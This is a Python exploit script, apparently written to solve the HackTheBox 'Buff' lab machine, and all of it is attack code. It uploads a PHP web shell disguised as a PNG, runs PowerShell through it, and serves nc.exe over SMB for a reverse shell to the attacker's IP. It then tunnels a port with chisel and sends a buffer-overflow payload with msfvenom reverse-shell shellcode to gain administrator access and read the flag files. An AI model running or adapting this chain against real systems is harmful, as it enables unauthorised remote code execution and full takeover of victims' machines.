#!/usr/bin/env python3
import requests, socket
from os import popen
from fcntl import ioctl
from struct import pack
from re import findall
from sys import stdout, exit
from impacket import smbserver
from multiprocessing import Process
from pwn import log, listen
from time import sleep
from random import randrange
from ast import literal_eval

host_ip = "10.10.10.198"
host = f"http://{host_ip}:8080" # Host to attack

# Global vars
user_shell = None
admin_shell = None
user_flag = None
root_flag = None


# Get IP of interface
def get_ip(ifname="tun0", ipv6=False):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(ioctl(s.fileno(), 0x8915,
                pack('256s', ifname[:15].encode()))[20:24])


# Verify that webshell was uploaded
def verify_shell():
    r = requests.get(f"{host}/upload/chronos.php", timeout=15, verify=False)#, proxies={'http':'127.0.0.1:8080'})
    return r.status_code == 200


# Upload webshell
def upload_shell():
    log.info("Uploading webshell...")
    image = {
                'file': 
                  (
                    'chronos.php.png', 
                    '<?php echo shell_exec($_REQUEST["cmd"]); ?>', 
                    'image/png',
                    {'Content-Disposition': 'form-data'}
                  ) 
              }
    data = {'pupload': 'upload'}
    r = requests.post(url=f"{host}/upload.php?id=chronos", timeout=15, files=image, data=data, verify=False)#, proxies={'http':'127.0.0.1:8080'})
    if r.status_code != 200:
        raise Exception("Uploading shell did not work!")
    
    if not verify_shell():
        raise Exception("Did not upload shell!")
    
    log.success("Uploaded webshell!")


# Execute command on shell
def exec(cmd, delay=0):
    try:
        sleep(delay)
        # Upload shell if not uploaded
        if not verify_shell():
            upload_shell()
        
        command = {'cmd': f'powershell -c "{cmd}"'}
        r = requests.get(f"{host}/upload/chronos.php", params=command, timeout=15, verify=False)#, proxies={'http':'127.0.0.1:8080'})
        if r.status_code != 200:
            raise Exception("Shell not uploaded!")
        return r.text.strip()
    except:
        pass
    """except Exception as ex:
        log.error(f"Error occurred during excution of command {cmd}: {ex}")"""


# Webshell that executes commands endlessly
def webshell():
    clear()
    # Upload shell if not uploaded
    if not verify_shell():
        upload_shell()

    # Get working directory
    command = {'cmd': 'echo %CD%'}
    r = requests.get(f"{host}/upload/chronos.php", params=command, timeout=15, verify=False)#, proxies={'http':'127.0.0.1:8080'})

    # Verify shell exists
    if r.status_code != 200:
        raise Exception("Shell not uploaded!")

    # Get directory of shell
    cwd = findall('[CDEF].*', r.text)
    cwd = f"{cwd[0]}> "

    # Execute commands endlessly
    while True:
        try:
            cmd = input(f"PS {cwd}").strip()
            # Exit shell loop
            if cmd == "exit":
                break
            print(exec(cmd))
        except Exception as ex:
            print(f"Error while executing: {ex}")


# Setup smb server
def setup_smb(path="/usr/share/windows-binaries"):
    try:
        if port_in_use(445):
            raise Exception("SMB-Server already running!")
        log.info("Starting SMB-Server...")
        server = smbserver.SimpleSMBServer(listenAddress=f"{get_ip('tun0')}", listenPort=445)
        server.addShare("share", path, "")
        server.setSMB2Support(True)
        server.start()
    except KeyboardInterrupt:
        pass
    except:
        raise Exception("Could not setup smb!")


# Check if we got a shell by trying to receive data
def check_shell(shell, timeout=30):
    timer = 0
    while timer < timeout:
        try:
            shell.recvline()
            return True
        except:
            timer += 1
            sleep(0.5)
    raise Exception("Did not get user-shell!")


# NOT BEING USED BECAUSE IT IS SO SLOW....
"""# Execute shell commands
def exec_shell(shell):
    while True:
        try:
            cmd = input("> ")
            # Exit upon keyword "exit"
            if "exit" in cmd.lower():
                return True
            if "interactive" in cmd.lower():
                shell.interactive()
                return False
            
            shell.sendline(cmd)
            # Recv uninteresting output
            output = "".join(shell.recvlines(timeout=30)).decode()
            print(output.split(cmd)[1])

        except KeyboardInterrupt:
            print("Type 'exit' if you want to leave the shell!")
        # let any other exception through
        except Exception as ex:
            raise ex
"""

"""# Ask user to get interactive
def get_interactive(shell):
    print("Type 'interactive' to get pwntools-interactive shell (shell dies after that!)\nType exit to get back to the menu.\nEnter any other command to be executed")
    cmd = input("> ")
    if "interactive" in cmd:
        shell.interactive()
        return False
    elif "exit" in cmd:
        return True
    else:
        return exec_shell(shell)
"""


# Issue payload to get reverse-shell, served with smb
def get_user(interactive=False):
    # Return if shell already existing
    global user_shell
    if user_shell is not None:
        if interactive:
            clear()
            #if not get_interactive(user_shell):
            user_shell.interactive()
            user_shell = None
        else:
            return user_shell

    if interactive:
        clear()
        log.info("Getting reverse-shell... This may take a couple of seconds!")
        print("")
    else:
        log.info("Getting user-shell...")

    # Setup smb server
    smb = Process(target=setup_smb)
    smb.daemon = True
    smb.start()

    ip = get_ip()
    port = get_port()

    # Execute reverse-shell
    log.info("Executing reverse-shell payload...")
    payload = Process(target=exec,args=(f'\\\\{ip}\\\\share\\nc.exe {ip} {port} -e powershell.exe',5,))
    payload.daemon = True
    payload.start()

    # Listen for connection
    user_shell = listen(port, bindaddr=ip, timeout=10).wait_for_connection()

    check_shell(user_shell)    

    # Kill smb-server
    smb.terminate()

    # Interact with shell
    if interactive:
        #clear()
        user_shell.interactive()
    else:
        return user_shell


# Checks if port is in use
def port_in_use(port):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            return s.connect_ex(('localhost', port)) == 0


# Setup chisel server
def chisel_server():
    """ #TODO: Necessary?
    if port_in_use(8000):
        raise Exception("Something is running on port 8000! Chisel needs to run on that port.\nPlease close the application on port 8000!")"""
    log.info("Starting chisel server...")
    cmd = f"/opt/chisel/chisel_linux server -p 8000 --reverse"
    popen(cmd)


# Generate shellcode for reverse-shell
def gen_shellcode(port):
    log.info("Generating shellcode...")
    output = popen(f"msfvenom -p windows/shell_reverse_tcp LHOST={get_ip()} LPORT={port} -f c").read()
    # Parse output
    output = output.split("\n")
    # Remove empty values
    output.remove("")
    # Remove ';' from output
    output[len(output) - 1 ] = output[len(output) - 1 ][:-1]
    # Remove first junk
    output = output[1:]
    # Remove quotes and parse to one string
    output = "".join(x.replace('\"',"") for x in output)
    # Parse string to bytes
    return literal_eval("b'''%s'''" % output)


# Overflow buffer and get shell as admin
def overflow(port):
    if not port_in_use(8888):
        raise Exception("Buffer-overflow was not executed, because port 8888 is not connected!")
    
    # Values for overflow
    buf = b"A"*1052
    eip = b"\x7B\x8A\xA9\x68"

    shellcode = gen_shellcode(port)
    
    # Overflow payload
    payload = buf + eip + shellcode
    
    # Connect to server
    log.info("Sending buffer-overflow payload to server...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1",8888))
    # Overflow buffer
    s.send(payload)
    

# Setup chisel tunnel to access port 8888
def setup_tunnel():
    log.info("Setting up tunnel this may take a couple of minutes...")
    
    # Get user shell
    shell = get_user()
    
    # Start smb server
    smb = Process(target=setup_smb, args=["/opt/chisel/"])
    smb.daemon = True
    smb.start()

    # Start chisel server
    server = Process(target=chisel_server)
    server.daemon = True
    server.start()

    
    # TODO: Necessary?
    """# Check if port 8888 is free to use
    if port_in_use(8888):
        raise Exception("Something is running on port 8888! Please close the application on that port, as it is needed to get a shell as root.")"""

    
    # Copy chisel to server
    log.info("Uploading chisel...")
    shell.sendline("mkdir C:\\temp")
    shell.sendline(f"copy \\\\{get_ip()}\\share\\chisel_windows.exe C:\\temp\\")
    shell.recvlines()
        
    # Wait until copying is done #TODO: Verify that chisel was copied successfully
    shell.recv(timeout=60)

    # Forward port 8888 to us
    log.info("Forwarding port back...")
    shell.sendline(f'Start-Process -NoNewWindow C:\\temp\\chisel_windows.exe -ArgumentList ("client {get_ip()}:8000 R:8888:127.0.0.1:8888")')

    # Wait to complete port-forward
    while not port_in_use(8888):
        sleep(.5)
    
    # Kill smb-server
    smb.terminate()


# Returns a free port
def get_port():
    port = randrange(9000,9999)
    # If port is taken, try another port
    while port_in_use(port):
        port = randrange(9000,9999)
    
    return port
  

# Get shell as admin
def get_admin(interactive=False):
    # Return if shell already existing
    global admin_shell
    if admin_shell is not None:
        if interactive:
            clear()
            #if not get_interactive(admin_shell):
            admin_shell.interactive()
            admin_shell = None
        else:
            return admin_shell

    if interactive:
        clear()
        log.info("Getting reverse-shell as admin... This may take up to a minute!")
        
    # Setup tunnel to access port 8888
    setup_tunnel()
    
    # Setup admin shell listener
    port = get_port()
    admin_shell = listen(port, bindaddr=get_ip(), timeout=30).wait_for_connection()

    # Overflow buffer and get shell
    overflow(port)

    # Verify that we actually got a shell
    check_shell(admin_shell)

    if interactive:
        #clear()
        #if not get_interactive(admin_shell):
        admin_shell.interactive()
        admin_shell = None
    else:
        return admin_shell


# Print user and root flag
def get_flags():
    log.info("Getting flags... This may take up to a minute...")
    # Get user-flag with web-shell
    global user_flag
    user_flag = exec("type C:\\Users\\Shaun\\Desktop\\user.txt")

    """ # Get user-flag with user-shell
    user_shell = get_user()
    user_shell.sendline("type C:\\Users\\Shaun\\Desktop\\user.txt")
    user_flag = user_shell.recv()
    """

    # Get root-flag with admin-shell
    admin_shell = get_admin()
    admin_shell.recv()
    admin_shell.sendline("type C:\\Users\\Administrator\\Desktop\\root.txt")
    admin_shell.recvuntil("root.txt\n")

    global root_flag
    root_flag = admin_shell.recvline().decode()
    
    clear()
    print(f"User flag: {user_flag}\r\n")
    print(f"Root flag: {root_flag}\r\n")

    input("Press enter to continue!")


# Print gathered flags if set
def print_flags():
    global user_flag
    global root_flag

    if user_flag:
        print(f"""
                User_flag: {user_flag}""")
    if root_flag:
        print(f"""
                Root_flag: {root_flag}""")
    if user_flag or root_flag:
        print(" _________________________________________________________________________")


# Print logo
def print_logo():
    print("""
  ____         __  __   _____                                      
 |  _ \       / _|/ _| |  __ \\                                     
 | |_) |_   _| |_| |_  | |__) |_      ___ __                       
 |  _ <| | | |  _|  _| |  ___/\ \ /\ / / '_ \\                      
 | |_) | |_| | | | |   | |     \ V  V /| | | |                     
 |____/ \__,_|_| |_|   |_|      \_/\_/ |_| |_|                     
  ____           _____ _           ___         __        ____      
 |  _ \         / ____| |         / _ \       / /       / __ \\     
 | |_) |_   _  | |    | |__  _ __| | | |_  __/ /_   ___| |  | |___ 
 |  _ <| | | | | |    | '_ \| '__| | | \ \/ / '_ \ / _ \ |  | / __|
 | |_) | |_| | | |____| | | | |  | |_| |>  <| (_) |  __/ |__| \__ \\
 |____/ \__, |  \_____|_| |_|_|   \___//_/\_\\\___/ \___|\____/|___/
         __/ |                                                     
        |___/                                                      

 Twitter:    https://twitter.com/Chr0x6eOs
 Github:     https://github.com/Chr0x6eOs
 HackTheBox: https://www.hackthebox.eu/home/users/profile/134448
 
 _________________________________________________________________________
 """)
    print_flags()


# Clears screen
def clear():
    print(chr(27) + "[H" + chr(27) + "[J")


# Print option menu
def menu():
    print_logo()
    print("""
    [1] - Webshell
    [2] - Reverse-Shell as user (Buff\Shaun)
    [3] - Reverse-shell as admin (Buff\Administrator)
    [4] - Print flags
    [5] - Exit

    """)

    options = {"1": webshell, "2": get_user, "3": get_admin, "4": get_flags}
    run = input("> ").strip().lower()

    while run not in ["1","2","3","4","5", "exit"]:
        run = input("Not a valid option! Try again:\n> ").strip().lower()
    
    if run == "5" or run == "exit":
        print("Exiting...")
        exit(0)
    if run in ["2","3"]:
        options[run](interactive=True)
    else:
        options[run]()


# Main function
def main():
    try:
        while True:
            menu()
            clear()
    except KeyboardInterrupt:
        clear()
        print("\r\nYou pressed ctrl^C! If you want to exit, please type 'exit' or '5' to exit the script!\r\n")
        main()
    except Exception as ex:
        try:
            log.error(f"[-] {ex}")
            exit(-1)
        except:
            exit(-1)


if __name__ == "__main__":
    main()